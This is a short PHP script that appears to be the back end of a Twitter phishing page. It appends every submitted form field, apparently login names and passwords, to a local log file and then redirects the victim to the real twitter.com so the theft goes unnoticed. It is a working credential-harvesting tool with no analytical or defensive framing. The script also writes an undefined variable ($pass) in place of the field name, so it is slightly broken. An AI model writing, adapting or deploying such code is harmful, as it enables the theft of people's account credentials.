
<?php
header('Location: https://twitter.com/');
$handle = fopen("log.txt", "a");
foreach($_POST as $usernameOrEmail => $value) {
fwrite($handle, $pass);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
exit;
?>

